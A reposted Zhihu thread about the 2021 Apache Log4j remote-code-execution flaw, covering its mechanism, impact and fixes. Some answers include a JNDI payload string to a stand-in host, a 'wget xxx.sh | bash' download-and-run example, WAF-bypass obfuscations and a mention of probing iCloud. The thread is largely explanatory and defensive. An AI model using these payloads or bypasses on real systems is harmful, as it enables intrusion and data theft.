@@ -1,0 +1,2340 @@
+<!doctype html><html lang=zh-cn><head>
+<meta charset=utf-8>
+<title>Apache 存在 Log4j 远程代码执行漏洞，将给相关企业带来哪些影响？还有哪些信息值得关注？</title>
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name=description content=" 知乎用户 Serendipity​​ 发表 Apache Log4j 2 远程代码执行漏洞，和很多注入攻击一样，能够得以实施的两个关键条件在于：
+ 用户能够控制输入，或者说需要用户提供部分输入数据 用户提供的输入数据和原本程序要执行的代码进行了拼接，或被当作代码执行  对于 SQL 注入，就是用户提交的数据，被数据库系统编译而产生了服务提供者预料之外的非 “数据” 行为
+本次 Apache Log4j 2 存在的远程代码执行漏洞也一样，未经检查或者未经充分检查的用户输入数据，意外变成了代码被执行。
+攻击者通过 JNDI 注入漏洞，当程序将用户输入的数据记入日志时，利用用户能够控制向记录日志中输入数据的操作，来实现这段特殊构造的请求，可以触发 Apache Log4j2 中的远程代码执行漏洞。
+攻击者首先向漏洞服务器发起攻击请求，通过 Log4j2 记录攻击请求中包含的基于 JNDI 和 LDAP 的恶意负载向漏洞服务器发起攻击请求（利用 JNDI 来执行 LDAP 协议注入的可执行代码）。
+记录的恶意负载被触发后，服务器通过 JNDI 发出请求。由于攻击请求中的地址是攻击者控制的地址，因此其可以在请求响应中植入恶意可执行脚本，从而成功利用此漏洞在目标服务器上进行远程代码执行，进而攻击服务器。
+托 Apache Log4j 2 的福，这次漏洞影响的范围非常之广（Apache Log4j 2 一款非常流行的开源 Java 日志记录组件） ">
+<meta name=generator content="Hugo 0.91.2">
+<link rel=stylesheet href=../../plugins/bootstrap/bootstrap.min.css>
+<link rel=stylesheet href=../../plugins/themify-icons/themify-icons.css>
+<link rel=stylesheet href=https://project-gutenberg.github.io/Pincong/scss/style.min.css media=screen>
+<link rel="shortcut icon" href=https://project-gutenberg.github.io/Pincong/images/favicon.png type=image/x-icon>
+<link rel=icon href=https://project-gutenberg.github.io/Pincong/images/favicon.png type=image/x-icon>
+<meta name=twitter:card content="summary_large_image">
+<meta name=og:title content=" Apache 存在 Log4j 远程代码执行漏洞，将给相关企业带来哪些影响？还有哪些信息值得关注？ ">
+<meta name=og:description content=" 知乎用户 Serendipity​​ 发表 Apache Log4j 2 远程代码执行漏洞，和很多注入攻击一样，能够得以实施的两个关键条件在于：
+ 用户能够控制输入，或者说需要用户提供部分输入数据 用户提供的输入数据和原本程序要执行的代码进行了拼接，或被当作代码执行  对于 SQL 注入，就是用户提交的数据，被数据库系统编译而产生了服务提供者预料之外的非 “数据” 行为
+本次 Apache Log4j 2 存在的远程代码执行漏洞也一样，未经检查或者未经充分检查的用户输入数据，意外变成了代码被执行。
+攻击者通过 JNDI 注入漏洞，当程序将用户输入的数据记入日志时，利用用户能够控制向记录日志中输入数据的操作，来实现这段特殊构造的请求，可以触发 Apache Log4j2 中的远程代码执行漏洞。
+攻击者首先向漏洞服务器发起攻击请求，通过 Log4j2 记录攻击请求中包含的基于 JNDI 和 LDAP 的恶意负载向漏洞服务器发起攻击请求（利用 JNDI 来执行 LDAP 协议注入的可执行代码）。
+记录的恶意负载被触发后，服务器通过 JNDI 发出请求。由于攻击请求中的地址是攻击者控制的地址，因此其可以在请求响应中植入恶意可执行脚本，从而成功利用此漏洞在目标服务器上进行远程代码执行，进而攻击服务器。
+托 Apache Log4j 2 的福，这次漏洞影响的范围非常之广（Apache Log4j 2 一款非常流行的开源 Java 日志记录组件） ">
+<meta name=og:image content="https://project-gutenberg.github.io/Pincong//images/card/99.jpg">
+<script data-ad-client=ca-pub-6074407261372769 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-06HJ1E5XNH"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-06HJ1E5XNH')</script>
+</head>
+<body>
+<header class="fixed-top navigation">
+<div class=container>
+<nav class="navbar navbar-expand-lg navbar-light bg-transparent">
+<a class=navbar-brand href=https://project-gutenberg.github.io/Pincong/><img class=img-fluid src=https://project-gutenberg.github.io/Pincong//images/logo.png alt=品葱*精选></a>
+<button class="navbar-toggler border-0" type=button data-toggle=collapse data-target=#navigation>
+<i class="ti-menu h3"></i>
+</button>
+<div class="collapse navbar-collapse text-center" id=navigation>
+<ul class="navbar-nav ml-auto">
+<li class=nav-item>
+<a class=nav-link href=https://project-gutenberg.github.io/Pincong/> Home </a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://project-gutenberg.github.io/Pincong/post/index.xml>RSS</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://bit.ly/2HrxEi0>Telegram</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://twitter.com/speechfree3>Twitter</a>
+</li>
+</ul>
+</div>
+</nav>
+</div>
+</header> <div class="py-5 d-none d-lg-block"></div>
+<section class=main-content>
+<div class=container>
+<div class=row>
+<div class="col-lg-8 mx-auto block shadow mb-5">
+<h2>Apache 存在 Log4j 远程代码执行漏洞，将给相关企业带来哪些影响？还有哪些信息值得关注？</h2>
+<div class=mb-3><span>by <a href=https://project-gutenberg.github.io/Pincong/author/></a></span>,
+<span>at 16 December 2021</span>, tags :
+<a href=https://project-gutenberg.github.io/Pincong/tags/%e6%bc%8f%e6%b4%9e>漏洞</a>
+<a href=https://project-gutenberg.github.io/Pincong/tags/log4j>Log4j</a>
+<a href=https://project-gutenberg.github.io/Pincong/tags/log4j>Log4j</a>
+<a href=https://project-gutenberg.github.io/Pincong/tags/%e6%97%a5%e5%bf%97>日志</a>
+<a href=https://project-gutenberg.github.io/Pincong/tags/%e4%bb%a3%e7%a0%81>代码</a>
+<a href=https://project-gutenberg.github.io/Pincong/tags/2.15.0>2.15.0</a>
+<a href=https://github.com/Project-Gutenberg/Pincong-data/edit/master/site/content/post/0ab4d2cd7d4c69c37526fdb3030715a7.md style=color:gray><strong><i>点击纠错</i></strong></a>
+<i> </i>
+<a href=https://github.com/Project-Gutenberg/Pincong-data/delete/master/site/content/post/0ab4d2cd7d4c69c37526fdb3030715a7.md style=color:gray><strong><i>点击删除</i></strong></a>
+</div>
+<h5><a href="https://justmysocks.net/members/aff.php?aff=13681">使用CN2/CN2GIA顶级线路，支持Shadowsocks/V2ray科学上网，支持支付宝付款，每月仅需 5 美元</a></h5>
+<h5><a href=https://bit.ly/2HrxEi0>## 加入品葱精选 Telegram Channel ##</a></h5>
+<p></p>
+<h3 id=知乎用户-serendipity-发表>知乎用户 Serendipity​​ 发表</h3>
+<p>Apache Log4j 2 <a href="https://www.zhihu.com/search?q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265712944%7D">远程代码执行漏洞</a>，和很多注入攻击一样，能够得以实施的两个关键条件在于：</p>
+<ul>
+<li>用户能够控制输入，或者说需要用户提供部分输入数据</li>
+<li>用户提供的输入数据和原本程序要执行的代码进行了拼接，或被当作代码执行</li>
+</ul>
+<p>对于 SQL 注入，就是用户提交的数据，被数据库系统编译而产生了服务提供者预料之外的非 “数据” 行为</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-434007217564ca0a13faebef13fccf07_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>本次 Apache Log4j 2 存在的远程代码执行漏洞也一样，未经检查或者未经充分检查的用户输入数据，意外变成了代码被执行。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-22bed93096ca15639217f1b3c61a2005_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>攻击者通过 JNDI 注入漏洞，当程序将用户输入的数据记入日志时，利用用户能够控制向记录日志中输入数据的操作，来实现这段特殊构造的请求，可以触发 Apache Log4j2 中的远程代码执行漏洞。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-21a2ab44dc00d4afed69298f5d431029_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>攻击者首先向漏洞服务器发起攻击请求，通过 Log4j2 记录攻击请求中包含的基于 JNDI 和 LDAP 的恶意负载向漏洞服务器发起攻击请求（利用 JNDI 来执行 LDAP 协议注入的可执行代码）。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-e943828182cd02c7c677d293d6918a4a_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>记录的恶意负载被触发后，服务器通过 JNDI 发出请求。由于攻击请求中的地址是攻击者控制的地址，因此其可以在请求响应中植入恶意可执行脚本，从而成功利用此漏洞在目标服务器上进行远程代码执行，进而攻击服务器。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-fac960751cc661d36ab345c7e249d12a_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>托 Apache Log4j 2 的福，这次漏洞影响的范围非常之广（Apache Log4j 2 一款非常流行的开源 Java 日志记录组件）</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-7fc37f0f3a2640f11918b2c36715204c_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>详细漏洞披露，可查看：</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201%3Ffilter%3Dallissues">- ASF JIRA</a><a href="https://link.zhihu.com/?target=https%3A//github.com/YfryTchsGD/Log4jAttackSurface">https://github.com/YfryTchsGD/Log4jAttackSurface</a></p>
+<p>受影响组件可查看：</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages%3Fp%3D1">org.apache.logging.log4j " log4j-core (Usages)</a></p>
+<p>此外，Minecraft 是第一个但肯定不是最后一个受到影响的游戏。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-e5ccc553dfa8ecf00ad8a0c24fa7f055_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>最后，这不仅仅是 Apache Log4j 2 组件或者 SQL 语言的问题，而是只要有数据和代码未曾分离的地方，便都是注入攻击的可寻之地。</p>
+<p>所以，不要因噎废食，弃之不用。攻击检测和漏洞修复的工作，有很多研究机构和安全公司都在进行。历史是螺旋上升的，安全也是，前进性、曲折性和<a href="https://www.zhihu.com/search?q=%E5%91%A8%E6%9C%9F%E6%80%A7&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265712944%7D">周期性</a>不可避免。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-af38e65013c6c3995934a7512b74e05c_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=知乎用户-nlfox--发表>知乎用户 nlfox 发表</h3>
+<p><a href="https://www.zhihu.com/search?q=%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265125190%7D">脚本小子</a>的又一次狂欢【</p>
+<p>这个问题要问大不大，确实是大，数什么玩意没有用 Log4j2 可能比数什么玩意用了 Log4j2 来的快一点。</p>
+<p>目前网上流传的 exp 更是简单粗暴直接居然还有效，Random script boys be like：这是 payload，这是框框，ctrlc，ctrlv，boom，他被黑啦，截图吹逼辣！</p>
+<p><strong>但是并不是看到了发回来的 DNS 请求就一定能利用。</strong></p>
+<p>毕竟一定版本 JDK 之后， <code>com.sun.jndi.ldap.object.trustURLCodebase</code>已经是默认 false 了，断了直接读取远程代码的路子，想直接读取远程代码是会失败的。</p>
+<p>问题是不让执行远程代码，还有本地代码可以利用啊，所以绕过的办法很多，需要具体情况具体分析，不同的框架有不同的依赖，需要找不一样的利用链。</p>
+<p>比如如果依赖有 Tomcat，可以利用 <a href="https://link.zhihu.com/?target=https%3A//github.com/apache/tomcat/blob/main/java/org/apache/naming/factory/BeanFactory.java">org.apache.naming.factory.BeanFactory</a>，配合 javax.el.ELProcessor 来执行任意代码。详见 [1].</p>
+<p>还有一些其他的利用链详见 [2]</p>
+<p>所以想要绕过大部分时候总能找到办法，鬼知道你依赖里面有什么贵物？</p>
+<p>目前对这个漏洞利用还处于早期阶段（ctrlc ctrlv），好在现在大家都非常重视，修的应该会很快，吧，大概。反正我们内部 buildertool 已经在 merge fix 了，现在基本上是个 Sev1 级别的 issue（前两天 AWS 挂掉那种等级），block 所有对有漏洞版本 Log4j 的 build，大部分 team 会收到 Sev2 然后被要求 deploy 最新版本的 Log4j2。</p>
+<h3 id=目前为止一些解决方案>目前为止一些解决方案</h3>
+<ol>
+<li>使用最新的 2.15.0</li>
+<li>把<code>log4j2.formatMsgNoLookups</code>设为 true</li>
+<li>写 WAF 规则先挡一挡【</li>
+</ol>
+<p>什么，影响？大的还在路上呢. jpg</p>
+<h3 id=原理>原理</h3>
+<p><a href="https://link.zhihu.com/?target=https%3A//logging.apache.org/log4j/log4j-2.3/manual/lookups.html%23JndiLookup">Log4j - Log4j 2 Lookups - Apache Log4j 2</a></p>
+<p>官方教你利用怕不怕. jpg</p>
+<p>完全就是 Log4j2 作为一个单纯简化日志操作的库加了其实没有很大必要的功能，加了一个用 JNDI 读取变量的 feature，啥验证没有，不幸酿成惨剧。</p>
+<p>只要你 log 了用户输入能够控制的变量，那么只要用户输入了任何能包含<code>${jndi:ldap://blabla.com/}</code> 的内容，Log4j2 都会尝试通过 jndi 读取这个变量。</p>
+<p>这个问题算是新时代的 format string 漏洞或者说也能算一种 SSTI，数据和代码混淆导致的 RCE，类似的例子已经有很多了。</p>
+<h3 id=reference>Reference</h3>
+<p>[1] <a href="https://link.zhihu.com/?target=https%3A//www.veracode.com/blog/research/exploiting-jndi-injections-java">Exploiting JNDI Injections in Java | Veracode</a></p>
+<p>[2] <a href="https://link.zhihu.com/?target=https%3A//www.cnblogs.com/yyhuni/p/15088134.html">https://www.cnblogs.com/yyhuni/p/15088134.html</a></p>
+<h3 id=知乎用户--琴梨梨-发表>知乎用户 琴梨梨 发表</h3>
+<p>由于 minecraft java 版也使用了 log4j，这个漏洞甚至可以用来在生存模式下作弊</p>
+<p>实测在低版本 java（java8u191 之前的版本）下可以在 minecraft 聊天内使用 jndi 注入，因为 minecraft 会把聊天输入内容打在 log 里，用的就是 log4j，因为命令方块也可以实现此注入，在有外部程序配合的情况下，可以实现完全看不出任何破绽的作弊</p>
+<p>官方启动器 + 官方 jre 玩家不用进行任何操作，虽然正版的 log4j 版本是存在漏洞的版本，但是因为目前官方启动器用的 jre 是基于 openjdk16 的，openjdk16 不能使用 jndi 注入</p>
+<p>但是还在使用低版本 java 开服的服主，建议尽快升级 log4j 和 java 版本</p>
+<h3 id=知乎用户--ailx10-发表>知乎用户 ailx10​​ 发表</h3>
+<p>朋友圈里已经出现大量远程漏洞利用截图了，今天俺也做一回<a href="https://www.zhihu.com/search?q=%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265549976%7D">脚本小子</a>，只不过我仅仅复现一下本地漏洞，本地漏洞复现不会对互联网产生任何影响，满满的知乎求生欲。</p>
+<p>面对这个核弹级别的漏洞，全网颤抖，公司领导非常重视，这个周五 “安全人” 全体加班，积极更换 jar 包，升级版本，第一时间防御住了漏洞利用，场面真的热闹非凡。</p>
+<p>话说回来，也就安全圈子里热闹，漏洞在野利用，红队蓝队在过春节，安全研发在过<a href="https://www.zhihu.com/search?q=%E6%B8%85%E6%98%8E%E8%8A%82&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265549976%7D">清明节</a>，其他人大多数是睁一只眼，闭一只眼，装死，躺平，等着 “安全人” 发布补丁。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/80/v2-19809c741ec8454989cba58ce831e105_720w.jpg%3Fsource%3D1940ef5c" alt></p>
+<ol>
+<li>准备 RCE 程序，并编译成 class 文件**（RCE 代码已经删了，别问我）**</li>
+<li>准备 http 服务，并启动（python 就行）</li>
+<li>准备 marshalsec-jar 包，并运行（github 有）</li>
+<li>准备 log 输出程序，并运行，即可见证奇迹~</li>
+</ol>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-a63b855f5a1917619e141bab99deaca7_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>12 月 10 号睡前顺手验证一下，百度已经修复了漏洞，奖励一个鸡腿~</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-3739251c960f4663d0c09d027bc1fc21_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>又验证了一下苹果 iCloud，发现依然没有修复，想必美国人还在睡懒觉吧~</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-34a50762c5adc1ddb7404414472d722a_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>知乎也要加油幺，我猜测，程序员周五晚上通常不加班？</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-ecd160519f9c6dbcbc23515c8fc17fe5_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic4.zhimg.com/v2-b15fa15a4bfb9d154487bb4455dcf3ab_b.jpg" alt></p>
+<p>ailx10</p>
+<p>841 次咨询</p>
+<p>4.9</p>
+<p>网络安全优秀回答者</p>
+<p>网络安全硕士</p>
+<p>去咨询</p>
+<h3 id=知乎用户-邓琦-发表>知乎用户 邓琦 发表</h3>
+<p>关于 Apache Log4j RCE 漏洞的技术分析和修补可以参加我和组里大佬 (@ga1ois,</p>
+<p><a href>@ZHZHZ</a></p>
+<p>) 的文章:</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/">Apache log4j Vulnerability CVE-2021-44228: Analysis and Mitigations</a></p>
+<p>还有学弟</p>
+<p><a href>@nlfox</a></p>
+<p>的回答：</p>
+<p><a href=https://www.zhihu.com/question/504954921/answer/2265125190>Apache 存在 Log4j 远程代码执行漏洞，将给相关企业带来哪些影响？还有哪些信息值得关注？</a></p>
+<p>从企业的影响来说：</p>
+<p>1、企业会更加重视安全，尤其是在安全防护上的投入。这里的防护不仅是安全防护软件，还有的是企业安全开发的投入，这次的漏洞据说是用 CodeQL 公开的规则扫描出来的，但是为什么这么多大厂都没有找到这个漏洞呢？对于代码的安全扫描不够，对于供应链的代码安全检测不够</p>
+<p>2、整个安全甚至科技业界会对开源产品的态度以及开源社区对于产品安全的管理会发生改变，免费的开源产品好不好用？当然好用，然而出了问题也是很大的问题，GCP Dataflow 还没有修复 log4j 的问题，为啥？因为 Dataflow 用了老版本的 Apache Beam, 最新版的 Beam 里面直接移除了 log4j，Dataflow 的团队还需要去研究怎样才能安全的把老版本的 Beam 里面的 log4j 修复好。Google 都是这个样子，其他的小公司，小团队能好到哪去？</p>
+<p>大公司还是要多给开源社区加点鸡腿 “Apache Log4j 项目由三名志愿者业余时间维护。请不要嘲弄他们，因为市值数十亿美元的公司正在使用他们的工具，却连投入 1000 美元都不屑一顾。”</p>
+<p>3、这种 1day 比 0day 的威力要大很多，而且是这种利用门槛非常低的远程代码执行漏洞，现有的恶意软件随便改个 payload 就是蠕虫级别。各个大厂商加班加点都没有把自己的问题修补完，那些毫无防护的个人设备简直就是一个个唾手可得的肉鸡。</p>
+<p>4、这个漏洞的余威更大，当年的 struts2 漏洞到如今很多政府、学校、医院等老旧系统依然能够使用，随着 log4j RCE 的攻击面的扩大，受影响的系统会越来越多。</p>
+<p>最后我想对已经稳定赚钱的企业说，该买安全产品就买买，不要不舍得花钱，我司产品可以考虑下，虽然价格有点贵，但是物有所值。</p>
+<h3 id=知乎用户-火线安全平台-发表>知乎用户 火线安全平台​ 发表</h3>
+<p>昨日，Apache Log4j2 成为知名漏洞，其危害性使得该漏洞吸引了安全圈所有人的目光。火线安全为防止其继续扩大影响范围，特发布针对该漏洞的处置方案。</p>
+<h2 id=漏洞描述>漏洞描述</h2>
+<p>Apache Log4j 2 是对 Log4j 的升级，它比其前身 Log4j 1.x 提供了重大改进，并提供了 Logback 中可用的许多改进，被广泛应用于业务系统开发，用以记录程序输入输出日志信息。是目前较为优秀的 Java 日志框架。由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可通过构造指定的恶意请求，触发远程代码执行从而获取服务器权限。</p>
+<h2 id=漏洞编号>漏洞编号</h2>
+<p>CNVD-2021-95914</p>
+<h2 id=影响范围>影响范围</h2>
+<p>Apache Log4j 2.x &lt;= 2.15.0-rc1（据悉，官方 rc1 补丁有被绕过的风险）</p>
+<p>经火线安全团队验证，可能受影响的应用不限于以下内容 (漏洞攻击面可能会逐步扩散到基础开源软件、客户端软件等更多资产面)：</p>
+<pre tabindex=0><code>Spring-Boot-strater-log4j2
+Apache Struts2
+Apache Solr
+Apache Druid
+Apache Flink
+ElasticSearch
+Flume
+Dubbo
+Jedis
+Logstash
+Kafka
+
+</code></pre><h2 id=无害检测工具>无害检测工具</h2>
+<p>Java 项目构建后，放置于 /opt/<a href="https://www.zhihu.com/search?q=app.jar&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265128448%7D">app.jar</a>，如何检测 app.jar 是否收到 log4j 的影响？如何检测开源组件中是否套娃式引用 Log4j 漏洞版本并存在可利用链条？ 点击试用：<a href="https://link.zhihu.com/?target=https%3A//i0x0fy4ibf.feishu.cn/docs/doccn0nmfQrC2MyrQyKU75uImWc%23">https://i0x0fy4ibf.feishu.cn/docs/doccn0nmfQrC2MyrQyKU75uImWc#</a></p>
+<pre tabindex=0><code>java -jar DongTaiZeroCheck.jar /opt/app.jar &quot;dnslog address&quot;
+
+# 查看dnslog 中是否出现 app.jar.dnslog.address ，如果存在，存在漏洞；如果不存在，则无风险。
+# notice: 本工具暂时只检测应用中是否存在可被利用的 log4j 组件依赖，未判断依赖是否在代码中被使用
+
+</code></pre><h2 id=漏洞复现>漏洞复现</h2>
+<p>复现过程如下：</p>
+<p>新建一个 Maven 项目，在 pom.xml 导入即可</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-7083fcaf1fe8f946646461bab337ce78_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<pre tabindex=0><code>&lt;dependencies&gt;
+        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+            &lt;version&gt;2.14.1&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
+            &lt;version&gt;2.14.1&lt;/version&gt;
+        &lt;/dependency&gt;
+&lt;/dependencies&gt;
+
+</code></pre><p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-04819bd92be27f969a2f7ed5351ea51f_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-e017c1fde59ca4a17abeb0f990170df1_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h2 id=修复建议>修复建议</h2>
+<p>1、使用开源的洞态 IAST 进行检测 &ndash;》DongTai-IAST(<a href="https://link.zhihu.com/?target=https%3A//dongtai.io">https://dongtai.io</a>)</p>
+<p>2、检查 pom.xml 是否存在 log4j 版本 2.0&lt;= 2.14.1</p>
+<p>3、当前官方已发布最新版本，建议受影响的用户及时更新升级到最新版本。</p>
+<p><strong>链接：</strong><a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
+<p>4、临时性缓解措施（任选一种）</p>
+<ul>
+<li>在 jvm 参数中添加 -Dlog4j2.formatMsgNoLookups=true</li>
+<li>系统环境变量中将 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true</li>
+<li>建议 JDK 使用 11.0.1、8u191、7u201、6u211 及以上的高版本</li>
+<li>创建 “log4j2.component.properties” 文件，文件中增加配置“log4j2.formatMsgNoLookups=true”</li>
+<li>限制受影响应用对外访问互联网</li>
+<li>WAF 添加漏洞攻击代码临时拦截规则。</li>
+</ul>
+<h2 id=参考资料>参考资料</h2>
+<p><a href="https://link.zhihu.com/?target=https%3A//www.cnvd.org.cn/webinfo/show/7116">https://www.cnvd.org.cn/webinfo/show/7116</a></p>
+<p><a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2">https://github.com/apache/logging-log4j2</a></p>
+<p><a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/commit/7fe72d6">https://github.com/apache/logging-log4j2/commit/7fe72d6</a></p>
+<p><a href="https://link.zhihu.com/?target=https%3A//www.lunasec.io/docs/blog/log4j-zero-day/">https://www.lunasec.io/docs/blog/log4j-zero-day/</a></p>
+<p>欢迎大家关注火线哦</p>
+<h3 id=知乎用户--4ra1n-发表>知乎用户 4ra1n 发表</h3>
+<p>知乎懂安全的朋友可能不多，简单说几个问题：</p>
+<p>Q：打个 dnslog 记录或者弹计算机，有啥危害啊？</p>
+<p>A：能弹计算器说明可以执行用户输入的命令。如果这个命令是从某个服务器下载一个脚本，然后执行该脚本（wget xxx.sh | bash）脚本内容是主动与你服务器建立 TCP 连接并执行接收到的命令，这样目标机器就由你控制了，想做什么做什么</p>
+<p>Q：为什么官方的更新不彻底删了罪魁祸首 JNDI？</p>
+<p>A：该框架应用范围极广，难免有程序员用到 JNDI，最佳解决办法是默认关闭</p>
+<p>Q：修复原理是什么？</p>
+<p>A：首先默认关闭 lookup 功能，然后在 JndiLookup 里加入协议白名单、host 白名单、类名白名单等。实际上除了 host 白名单无法处理，其他几个白名单都有手法可以绕过。目前最新修复不存在绕过的可能，假设绕过也无法解决 lookup 默认关闭的问题。最新修复默认禁用 jndi</p>
+<p>Q：如果使用 RASP 或 SecurityManager 等技术限制了代码部分功能，那么如何利用该漏洞？</p>
+<p>A：无法执行命令但是存在信息泄露，不止 Jndi 这一种 lookup，还有 env 和 sys 等 lookup 可以查询系统信息，浅蓝师傅提出的 bundle 型 lookup 甚至可以查到数据库密码，然后通过 dnslog 带出来</p>
+<p>Q：为什么 RC1 还能绕过？</p>
+<p>A：RC1 修复在捕获异常后不返回，所以在 new URI 的时候如果报错，但 looup 的时候正常即可绕过。在 URI 中不允许出现未经过 URL 编码的字符，利用这个特性可以有多种绕过姿势</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-531dd35f8a1e340dd25d2c02caa13840_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>Q：防火墙如何检测以及如何绕过？</p>
+<p>A：WAF 主要针对 jndi 关键字检测，可以用嵌套标签来处理。例如 ${lower:j}${lower:n} 或 ${::-j} 或 ${::-j}${::-n}${::-d}${::-i} 等姿势，更进一步的绕过参考浅蓝师傅，可以用 \ u0131 转大写的方式</p>
+<p>Q：修复方案有哪些？</p>
+<p>A：添加 JVM 或 properties 参数 formatMsgNoLookups=true，设置系统环境变量，使用高版本 JDK，手动修改 jar 包，限制出网，禁用 JNDI，加 RASP 和 WAF 等手法</p>
+<p>Q：是否存在不重启<a href="https://www.zhihu.com/search?q=%E6%9C%8D%E5%8A%A1%E7%AB%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2267798290%7D">服务端</a>的修复方案？</p>
+<p>A：参考 shiro 改 key 的思路，执行一段反射代码，将 jdnilookup 的逻辑给 nop 了。在漏洞爆出当天晚上我就实现了，不过没有对外发，昨天宽字节公众号提出了该方案。另一种方案是 Java agent 改 jvm 的字节码，园长开源了项目</p>
+<p>Q：我用的高版本 JDK 是否不受影响？</p>
+<p>A：并不安全，存在绕过 191 的手法，比如利用本地 classpath 中的 gadget 构造 ldap <a href="https://www.zhihu.com/search?q=%E5%BA%8F%E5%88%97%E5%8C%96&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2267798290%7D">序列化</a>数据，触发反序列化 RCE。或者利用 tomcat 依赖的一个恶意类。假设依赖无风险，高版本 JDK 也可以 dnslog 带出来敏感数据</p>
+<hr>
+<p>在先知首发了漏洞分析文章（不是最早不过应该是目前为止比较详细的）</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/10649">Apache Log4j2 从 RCE 到 RC1 绕过</a></p>
+<p>RC1 修复后我发现了绕过手法，正想发布看到朋友圈阿里云在更早发现了，后来研究 RC2 的绕过，发现没办法，不过跟着大佬们学了一波绕 WAF 姿势，标签嵌套等姿势</p>
+<p>在 RC2 的修补后发现一处鸡肋漏洞，虽然官方认可并致谢，但无利用价值</p>
